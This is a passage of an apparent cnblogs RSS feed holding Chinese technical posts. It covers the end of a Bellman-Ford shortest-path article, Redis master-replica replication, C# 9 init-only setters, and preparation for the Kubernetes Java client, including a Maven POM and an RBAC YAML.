&lt;p&gt;　　下图是 Bellman-Ford 算法在一幅含有负权重环的有向图中的运行轨迹。头两轮放松操作与前面的例子一样，在第三轮中，算法放松了边 7 -&amp;gt; 3 和 5 -&amp;gt; 1 并将顶点 3 和 1 加入队列后开始放松负权重边 5 -&amp;gt; 4 。在这次放松操作中算法发现了一个负权重环 4 -&amp;gt; 5 -&amp;gt; 4 。它将 5 -&amp;gt; 4 加入最短路径树中并在 edgeTo[ ] 将环和起点隔离起来。从这时开始，算法沿着环继续运行并减少到达所遇到的所有顶点的距离，直至检测到环的存在，此时队列非空。环被保存在 edgeTo[ ] 中，FindNegativeCycle 会在其中找到它。&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201231075906225-551325667.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;&lt;strong&gt; 　　7.总结&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; 　　下表总结了上面的各种最短路径算法的重要性质。在这些算法中进行选择的第一个条件是问题所涉及的有向图的基本性质。它含有负权重的边吗？它含有环吗？它含有负权重的环吗？除了这些基本性质之外，加权有向图的特性多种多样，因此在有多个合适的选择时就需要通过实验找出最佳算法。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201231081139944-1270610558.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

</description>
<pubDate>Thu, 31 Dec 2020 00:12:00 +0000</pubDate>
<dc:creator>Ruby_Lu</dc:creator>
<og:description>从一个顶点到达另一个顶点的成本最小的路径。 我们采用一个一般性的模型，即加权有向图。在加权有向图中，每条有向路径都有一个与之关联的路径权重，它是路径中的所有边的权重之和。这种重要的度量方式使得我们能够</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/afei-24/p/14077501.html</dc:identifier>
</item>
<item>
<title>Redis基础篇（六）数据同步：主从复制 - 大杂草</title>
<link>http://www.cnblogs.com/liang24/p/14189679.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/liang24/p/14189679.html</guid>
<description>&lt;p&gt;Redis具有高可靠性，体现在两方面：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;一是数据尽量少丢失，通过前面介绍的持久化方式AOF和RDB，在宕机时可以恢复数据。&lt;/li&gt;
&lt;li&gt;二是服务尽量少中断，通过副本冗余来实现。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;今天我们学习的就是通过主从复制实现副本冗余，从而实现Redis的高可靠性。&lt;/p&gt;
&lt;h2&gt;什么是主从复制&lt;/h2&gt;
&lt;p&gt;Redis提供主从库模式，保证数据副本的一致，主从库之间采用的是读写分离的方式。&lt;/p&gt;
&lt;h3&gt;为什么要读写分离？&lt;/h3&gt;
&lt;p&gt;如果允许所有节点能够处理读写请求，就需要解决加锁、实例间协商、数据同步等操作，会带来巨额的开销。&lt;/p&gt;
&lt;p&gt;因此采用主从库模式时，要配置主库只写，从库只读。&lt;/p&gt;
&lt;h2&gt;主从库如何进行第一次同步？&lt;/h2&gt;
&lt;p&gt;当设置了主从库模式，此时从库是空的，如何进行主从库的第一次同步呢？&lt;/p&gt;
&lt;p&gt;Redis采用全量复制来进行第一次同步，具体有三个步骤，如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://static001.geekbang.org/resource/image/63/a1/63d18fd41efc9635e7e9105ce1c33da1.jpg&quot; alt=&quot;image&quot; width=&quot;800&quot; height=&quot;356&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第一步，主从库建立连接，协商同步。&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;从库发送psync命令，表示进行数据同步。其中runID表示主库ID，第一次不知道主库的runID，就设置为&quot;?&quot;&lt;/li&gt;
&lt;li&gt;主库收到psync命令后，用FULLRESYNC响应，返回runID（主库ID）和offset（主库目前的复制进度）。&lt;/li&gt;
&lt;li&gt;从库收到响应后，记录这两个参数&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;strong&gt;第二步：主库同步数据给从库。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;从库收到数据后，在本地完成数据加载。这过程依赖于RDB快照。&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;主库执行bgsave命令，生成RDB文件，再把文件发强从库。&lt;/li&gt;
&lt;li&gt;从库收到RDB文件后，先清空当前数据库，然后加载RDB文件。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;strong&gt;第三步，主库发送新写命令给从库&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;主库在数据同步过程中，会记录所有写操作，避免丢失同步过程接收的新的写命令。&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;主库使用replication buffer来新的写命令。&lt;/li&gt;
&lt;li&gt;当从库加载RDB文件完成后，主库再把replication buffer的内容发送给从库，从库再执行这些操作实现同步。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;关于replication buffer的更多内容，下面再介绍。&lt;/p&gt;
&lt;p&gt;如果有多个从库，每个从库都要跟主库进行全量同步，这样主库的压力会很大。&lt;/p&gt;
&lt;h3&gt;主从级联模式&lt;/h3&gt;
&lt;p&gt;Redis提供“主-从-从”模式将主库生成RDB和传输RDB的压力，以级联的方式分散到从库上。&lt;/p&gt;
&lt;p&gt;简单来说，构建父子从库结构，子从库的数据同步从父从库获取。如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://static001.geekbang.org/resource/image/40/45/403c2ab725dca8d44439f8994959af45.jpg&quot; alt=&quot;image&quot; width=&quot;800&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在从库上执行命令：&lt;code&gt;replicaof 所选从库的IP 6379&lt;/code&gt;，就可以设置从库的父从库了。&lt;/p&gt;
&lt;p&gt;至此，主从库完成了第一次同步，那后续如何保持同步呢？&lt;/p&gt;
&lt;h2&gt;如何保持同步？&lt;/h2&gt;
&lt;p&gt;当主从库完成同步后，会维护一个网络连接，主库会通过这个连接将后续的命令同步给从库。&lt;/p&gt;
&lt;p&gt;但是这里有潜在的风险点：如果网络断连或者出现阻塞了，那怎么办呢？&lt;/p&gt;
&lt;h3&gt;主从库间网络断了怎么办？&lt;/h3&gt;
&lt;p&gt;在Redis 2.8之前，网络断了后要重新进行全量复制。但在Redis 2.8之后，Redis提供了增量复制的方式。&lt;/p&gt;
&lt;p&gt;当建立了主从结构后，主库会把写命令写入repl_backlog_buffer缓冲区里，当网络断开并重新连接后，从库会发送同步命令，然后主库再把未同步的命令发送给从库，从库执行这些命令就恢复数据一致了。具体流程如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://static001.geekbang.org/resource/image/20/16/20e233bd30c3dacb0221yy0c77780b16.jpg&quot; alt=&quot;增量复制流程&quot; width=&quot;800&quot;/&gt;&lt;/p&gt;
&lt;p&gt;repl_backlog_buffer是一个环形缓冲区，如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://static001.geekbang.org/resource/image/13/37/13f26570a1b90549e6171ea24554b737.jpg&quot; alt=&quot;image&quot; width=&quot;800&quot;/&gt;&lt;/p&gt;
&lt;p&gt;由于其环形结构，当因为网络问题影响从库读取命令的速度，会出现写满后继续写入命令时，会覆盖掉从库还没读的内容，从而造成数据不一致，需要重新全量复制。&lt;/p&gt;
&lt;p&gt;因此要根据情况来设置repl_backlog_buffer的大小，通过配置repl_backlog_size来调整缓冲区大小。配置公式为：&lt;strong&gt;缓冲空间大小 = 主库写入命令速度 * 操作大小 &lt;em&gt;-&lt;/em&gt; 主从库间网络传输命令速度 * 操作大小&lt;/strong&gt;。而&lt;strong&gt;repl_backlog_size= 缓冲空间 * 2&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;例如主库写操作2000/秒，每个操作大小2KB，网络传输1000个操作/秒，那缓冲空间大小=2000*2 - 1000*2=2MB，那repl_backlog_size就设置为4MB。&lt;/p&gt;
&lt;h2&gt;拓展&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;为什么主库间的数据复制同步不使用AOF？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;有三方面原因：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;RDB文件是经过二进制压缩的，文件很小，这样主从库间传输就很快。&lt;/li&gt;
&lt;li&gt;从库加载RDB文件速度很快，而AOF日志还要逐行命令执行，速度很慢。&lt;/li&gt;
&lt;li&gt;假设使用AOF，那就必须打开AOF，Redis默认是不开启AOF的，可能会影响Redis性能。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;strong&gt;关于replication buffer&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;每个与Redis通信的客户端（从库也算client），都会分配一个buffer，所有数据交互都是通过这个buffer进行的。&lt;/p&gt;
&lt;p&gt;Redis先把数据写到这个buffer中，然后再把buffer中的数据发到client的socket中，通过网络发送出去，完成数据交互。&lt;/p&gt;
&lt;p&gt;而主从同步的这个buffer，是用于保证主从数据一致的，所以才叫它replication buffer。&lt;/p&gt;
&lt;p&gt;可以通过配置项&lt;code&gt;client-output-buffer-limit&lt;/code&gt;来配置这个buffer的大小。当保存到buffer里的内容超过限制，主库会强制断开这个client的连接。这样会有潜在风险。&lt;/p&gt;
&lt;p&gt;如果从库处理主库传输的命令非常慢，就会把这个buffer撑满，然后主库会断开连接。中断后，从库再次发起复制请求，可能会导致恶性循环，引发复制风暴。&lt;/p&gt;
&lt;h2&gt;小结&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;主从库模式是采用RDB快照的全量复制 + 基于长连接的网络通信实现主从复制的。&lt;/li&gt;
&lt;li&gt;通过“主-从-从”模式，将主库生成RDB和传输RDB的压力，以级联的方式分散到从库上。&lt;/li&gt;
&lt;li&gt;当网络中断，通过主库的repl_backlog_buffer，实现增量复制，无须重新全量复制。&lt;/li&gt;
&lt;li&gt;repl_backlog_buffer是环形缓冲区，要根据网络状况，合理配置其大小。&lt;/li&gt;
&lt;li&gt;一个Redis实例的数据库不要太大，在几GB比较合适，这样可以减少RDB文件生成、传输和重新加载的开销。&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;参考资料&lt;/h2&gt;
</description>
<pubDate>Thu, 31 Dec 2020 00:09:00 +0000</pubDate>
<dc:creator>大杂草</dc:creator>
<og:description>Redis具有高可靠性，体现在两方面： 一是数据尽量少丢失，通过前面介绍的持久化方式AOF和RDB，在宕机时可以恢复数据。 二是服务尽量少中断，通过副本冗余来实现。 今天我们学习的就是通过主从复制实现</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/liang24/p/14189679.html</dc:identifier>
</item>
<item>
<title>C# 9 新特性——init only setter - WeihanLi</title>
<link>http://www.cnblogs.com/weihanli/p/14214401.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/weihanli/p/14214401.html</guid>
<description>&lt;h2 id=&quot;intro&quot;&gt;Intro&lt;/h2&gt;
&lt;p&gt;C# 9 中新支持了 &lt;code&gt;init&lt;/code&gt; 关键字，这是一个特殊的 &lt;code&gt;setter&lt;/code&gt;，用来指定只能在对象初始化的时候进行赋值，另外支持构造器简化的写法，比如：&lt;code&gt;Target-typed new expression&lt;/code&gt; 在已知类型的情况下可以使用 &lt;code&gt;new()&lt;/code&gt; 来代表构造方法的简化用法，可以简化字段的声明，也可以简化一次声明多个相同类型的变量&lt;/p&gt;
&lt;h2 id=&quot;sample&quot;&gt;Sample&lt;/h2&gt;
&lt;p&gt;来看一个示例，我们定义一个测试用的 &lt;code&gt;Person&lt;/code&gt; 类，测试代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;public class Person
{
    public int Age { get; init; }

    public string Name { get; init; }

    public string Description { get; set; }

    public override string ToString()
    {
        return $&quot;Name:{Name}(Age:{Age})&quot;;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;init&lt;/code&gt; 是一个特殊的 setter 适用于&lt;strong&gt;实例属性&lt;/strong&gt;，被标记为 &lt;code&gt;init&lt;/code&gt; 的属性，只能在实例化的时候通过初始化器来赋值，实例化操作完成后不允许再修改值。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;var p1 = new Person()
{
    Name = &quot;Michael&quot;,
    Age = 10
};
Console.WriteLine(p1);
// compiler error，不能对 init 的字段再赋值
// p1.Age = 12;

// Target-Typed new expression, C#9 新特性
Person p2 = new()
{
    Name = &quot;Jane&quot;,
    Age = 10,
}, p3 = new()
{
    Name = &quot;Alice&quot;
};
Console.WriteLine(p2);
Console.WriteLine(p3);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;init&lt;/code&gt; 的等效写法，&lt;code&gt;init&lt;/code&gt; 类似于 &lt;code&gt;set&lt;/code&gt; ，但是 &lt;code&gt;init&lt;/code&gt; 对应的字段会是一个 &lt;code&gt;readonly&lt;/code&gt; 的字段，来保证只能在构造器中或者初始化器中被赋值，另外编译器会做检查如果是 &lt;code&gt;init&lt;/code&gt;，会有一个特殊的标识，在初始化后再赋值的时候就会报错，类似于下面这样：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;internal class TestInitModel
{
    private readonly string _name;

    public string Name
    {
        get =&amp;gt; _name;
        init =&amp;gt; _name = value;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们以上面的 &lt;code&gt;Person&lt;/code&gt; 为例来看一下生成 IL 代码的区别：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/489462/202012/489462-20201231074243242-704281282.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到声明为 &lt;code&gt;init&lt;/code&gt; 的 属性会比普通的 &lt;code&gt;set&lt;/code&gt; 多出来一个修饰符，这是由编译器去生成的，编译器也会根据此去判断是否是在初始化的时候赋值，如果不是就会报错。&lt;/p&gt;
&lt;p&gt;序列化是否会有问题呢，我们来测试一下，可以看到 &lt;code&gt;model1&lt;/code&gt; 是被正常赋值(这里的 &lt;code&gt;ToJson&lt;/code&gt;/&lt;code&gt;JsonToObject&lt;/code&gt;是基于 &lt;code&gt;Newtonsoft.Json&lt;/code&gt; 的 &lt;code&gt;JsonConvert&lt;/code&gt; 封装的扩展方法)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/489462/202012/489462-20201231074229263-1214973124.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;more&quot;&gt;More&lt;/h2&gt;
&lt;p&gt;我觉得 &lt;code&gt;init&lt;/code&gt; 为我们带来的好处在于，可以在初始化的时候赋值而非直接通过构造器赋值，如果希望一个属性只能 &lt;code&gt;get&lt;/code&gt; ，不在初始化之外的地方被赋值，之前我的做法都是在构造器里初始化，只保留一个 &lt;code&gt;getter&lt;/code&gt;，没有 &lt;code&gt;setter&lt;/code&gt;，有了这个支持之后就可以不需要修改构造方法比较方便的使用了&lt;/p&gt;
&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
</description>
<pubDate>Wed, 30 Dec 2020 23:44:00 +0000</pubDate>
<dc:creator>WeihanLi</dc:creator>
<og:description>c# 9 init only setter</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/weihanli/p/14214401.html</dc:identifier>
</item>
<item>
<title>Kubernetes官方java客户端之一：准备 - 程序员欣宸</title>
<link>http://www.cnblogs.com/bolingcavalry/p/14214399.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/bolingcavalry/p/14214399.html</guid>
<description>&lt;h3 id=&quot;欢迎访问我的github&quot;&gt;欢迎访问我的GitHub&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/zq2599/blog_demos&quot; target=&quot;_blank&quot;&gt;https://github.com/zq2599/blog_demos&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;内容：所有原创文章分类汇总及配套源码，涉及Java、Docker、Kubernetes、DevOPS等；&lt;/p&gt;
&lt;h3 id=&quot;关于kubernetes官方java客户端&quot;&gt;关于Kubernetes官方java客户端&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;Kubernetes官方java客户端全称是&lt;span&gt;Kubernetes Java Client&lt;/span&gt;，是K8S官方推出的java库，以8.0.2版本为例，其maven坐标如下：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;io.kubernetes&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;client-java&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;8.0.2&amp;lt;/version&amp;gt;
    &amp;lt;scope&amp;gt;compile&amp;lt;/scope&amp;gt;
&amp;lt;/dependency&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;2&quot; readability=&quot;3&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;本文是《Kubernetes官方java客户端》系列的第一篇，主要内容是了解概念，再为后续章节的做好准备工作；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;回想咱们通常是如何操作K8S环境的，例如部署deployment，可以在dashboard页面上传yaml文件，也能在SSH终端执行kubectl命令，这些操作的去向都是K8S的API Server，如下图：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201231073955047-847130810.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;从上图可见，如果能把请求发送到API Server，就可以像&lt;span&gt;kubectl&lt;/span&gt;命令那样操作K8S了，K8S官方java客户端（Kubernetes Java Client）就是拥有这样能力的SDK，使得java应用拥有kubectl那样的能力，如下图所示，加载了K8S官方java客户端库的SpringBoot应用，可以直接将请求发送到K8S环境：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201231073955743-1857229208.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;需要准备什么&quot;&gt;需要准备什么&lt;/h3&gt;
&lt;p&gt;《Kubernetes官方java客户端》是以实战为主的系列文章，为了后面实战顺利进行，会在本章进行准备工作，包括硬件、软件、配置等方面，接下来会逐一列出；&lt;/p&gt;
&lt;h3 id=&quot;开发环境&quot;&gt;开发环境&lt;/h3&gt;
&lt;p&gt;我这边用来编码的环境如下：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;操作系统：macOS Catalina 10.15.5&lt;/li&gt;
&lt;li&gt;JDK：1.8.0_121&lt;/li&gt;
&lt;li&gt;Maven：33.3.9&lt;/li&gt;
&lt;li&gt;开发工具：IntelliJ IDEA 2019.3.2 (Ultimate Edition)&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;运行环境&quot;&gt;运行环境&lt;/h3&gt;
&lt;p&gt;编码完成后要运行在K8S环境，该环境只有一台CentoOS电脑，信息如下：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;操作系统：CentOS Linux release 7.8.2003&lt;/li&gt;
&lt;li&gt;K8S：1.15.3&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;选定client-java版本&quot;&gt;选定client-java版本&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;K8S有多个版本，java客户端也有多个版本，用的时候如何选择呢？请参考官方给出的兼容性列表：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201231073956214-1274867253.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/li&gt;
&lt;li&gt;如上图，横向是K8S版本，纵向是java客户端版本，表格中有三种符号，含义如下：&lt;/li&gt;
&lt;/ol&gt;&lt;ul&gt;&lt;li&gt;✓ 表示从特性到API，客户端和K8S环境都匹配；&lt;/li&gt;
&lt;li&gt;+ 表示客户端有些特性和API与K8S环境无法匹配，但是他们共有的特性和API都能正常运行；&lt;/li&gt;
&lt;li&gt;- 表示当前K8S环境上有些特性和API是客户端无法提供的；&lt;/li&gt;
&lt;li&gt;我的K8S版本是&lt;span&gt;1.15&lt;/span&gt;，可见&lt;span&gt;7.0.0&lt;/span&gt;版本的客户端是最合适的，后续的实战中也就选用该版本了，请您根据自己K8S的情况选择对应版本；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;springboot应用操作权限&quot;&gt;SpringBoot应用操作权限&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;后面的实战中，咱们的SpringBoot应用会以Pod的形式运行在K8S环境，通过client-java的API操作K8S，而K8S自然不会允许Pod随意对环境中的pod、deployment这些资源进行操作，因此我们要遵照K8S的规范进行RBAC相关的操作；&lt;/li&gt;
&lt;li&gt;K8S的角色设置可以非常详细，但也会更复杂，咱们还是不要花太多时间在这上面吧，这里我选择了使用K8S自带的最高权限的角色：&lt;span&gt;cluster-admin&lt;/span&gt;，您可以按照自己的实际情况定制角色，下面是具体操作；&lt;/li&gt;
&lt;li&gt;SSH登录K8S，创建namespace：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;kubectl create namespace kubernetesclient
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;创建文件rbac.yaml，内容如下：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-yaml&quot;&gt;apiVersion: v1
kind: ServiceAccount
metadata:
  name: kubernates-client-service-account
  namespace: kubernetesclient
---
kind: ClusterRoleBinding
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: kubernates-client-cluster-role-binding
subjects:
  - kind: ServiceAccount
    name: kubernates-client-service-account
    namespace: kubernetesclient
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;5&quot;&gt;&lt;li&gt;今后的实战中，SpringBoot应用都会部署在名为&lt;span&gt;kubernetesclient&lt;/span&gt;的namespace之下，使用名为&lt;span&gt;kubernates-client-service-account&lt;/span&gt;的Service Account；&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;ieda安装插件&quot;&gt;IEDA安装插件&lt;/h3&gt;
&lt;p&gt;因为项目中用到了&lt;span&gt;Slf4j&lt;/span&gt;注解，请在IEDA上安装&lt;span&gt;lombok&lt;/span&gt;插件，否则编写log相关代码的时候会有红叉：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201231073956595-168292391.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;创建所有java应用的父工程&quot;&gt;创建所有java应用的父工程&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;后面的实战要创建多个SpringBoot应用，有必要提前创建一个父maven工程，将依赖库的定义和版本都放在在此；&lt;/li&gt;
&lt;li&gt;创建名为&lt;span&gt;kubernetesclient&lt;/span&gt;的maven工程，pom.xml如下：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;
         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;
    &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt;

    &amp;lt;parent&amp;gt;
        &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
        &amp;lt;artifactId&amp;gt;spring-boot-starter-parent&amp;lt;/artifactId&amp;gt;
        &amp;lt;version&amp;gt;2.3.1.RELEASE&amp;lt;/version&amp;gt;
        &amp;lt;relativePath/&amp;gt; &amp;lt;!-- lookup parent from repository --&amp;gt;
    &amp;lt;/parent&amp;gt;

    &amp;lt;groupId&amp;gt;com.bolingcavalry&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;kubernetesclient&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;1.0-SNAPSHOT&amp;lt;/version&amp;gt;
    &amp;lt;packaging&amp;gt;pom&amp;lt;/packaging&amp;gt;

    &amp;lt;modules&amp;gt;
        &amp;lt;module&amp;gt;helloworld&amp;lt;/module&amp;gt;
        &amp;lt;module&amp;gt;outsidecluster&amp;lt;/module&amp;gt;
    &amp;lt;/modules&amp;gt;

    &amp;lt;properties&amp;gt;
        &amp;lt;java.version&amp;gt;1.8&amp;lt;/java.version&amp;gt;
    &amp;lt;/properties&amp;gt;

    &amp;lt;dependencies&amp;gt;
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;spring-boot-starter-test&amp;lt;/artifactId&amp;gt;
            &amp;lt;scope&amp;gt;test&amp;lt;/scope&amp;gt;
            &amp;lt;exclusions&amp;gt;
                &amp;lt;exclusion&amp;gt;
                    &amp;lt;groupId&amp;gt;org.junit.vintage&amp;lt;/groupId&amp;gt;
                    &amp;lt;artifactId&amp;gt;junit-vintage-engine&amp;lt;/artifactId&amp;gt;
                &amp;lt;/exclusion&amp;gt;
            &amp;lt;/exclusions&amp;gt;
        &amp;lt;/dependency&amp;gt;
    &amp;lt;/dependencies&amp;gt;

    &amp;lt;dependencyManagement&amp;gt;

        &amp;lt;dependencies&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;io.kubernetes&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;client-java&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;7.0.0&amp;lt;/version&amp;gt;
                &amp;lt;scope&amp;gt;compile&amp;lt;/scope&amp;gt;
            &amp;lt;/dependency&amp;gt;
        &amp;lt;/dependencies&amp;gt;

    &amp;lt;/dependencyManagement&amp;gt;
&amp;lt;/project&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;由于这是个父工程，因此目前除了pom.xml暂时没有其他内容，后面的实战会往里面添加子工程；&lt;/p&gt;
&lt;h3 id=&quot;全系列源码下载&quot;&gt;全系列源码下载&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;本次实战用到了一个普通的SpringBoot工程，源码可在GitHub下载到，地址和链接信息如下表所示(&lt;a href=&quot;https://github.com/zq2599/blog_demos&quot; target=&quot;_blank&quot;&gt;https://github.com/zq2599/blog_demos&lt;/a&gt;)：&lt;/li&gt;
&lt;/ol&gt;&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;这个git项目中有多个文件夹，本章的应用在&lt;span&gt;kubernetesclient&lt;/span&gt;文件夹下，如下图红框所示：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201231073957312-797352551.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;以上就是实战前的准备工作了，感谢您的关注，后面的实战会更加精彩；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;你不孤单，欣宸原创一路相伴&quot;&gt;你不孤单，欣宸原创一路相伴&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105068742&quot; target=&quot;_blank&quot;&gt;Java系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086498&quot; target=&quot;_blank&quot;&gt;Spring系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086732&quot; target=&quot;_blank&quot;&gt;Docker系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086794&quot; target=&quot;_blank&quot;&gt;kubernetes系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086850&quot; target=&quot;_blank&quot;&gt;数据库+中间件系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086920&quot; target=&quot;_blank&quot;&gt;DevOps系列&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;欢迎关注公众号：程序员欣宸&quot;&gt;欢迎关注公众号：程序员欣宸&lt;/h3&gt;
&lt;blockquote readability=&quot;4.258064516129&quot;&gt;
&lt;p&gt;微信搜索「程序员欣宸」，我是欣宸，期待与您一同畅游Java世界...&lt;br/&gt;&lt;a href=&quot;https://github.com/zq2599/blog_demos&quot; target=&quot;_blank&quot;&gt;https://github.com/zq2599/blog_demos&lt;/a&gt;&lt;/p&gt;
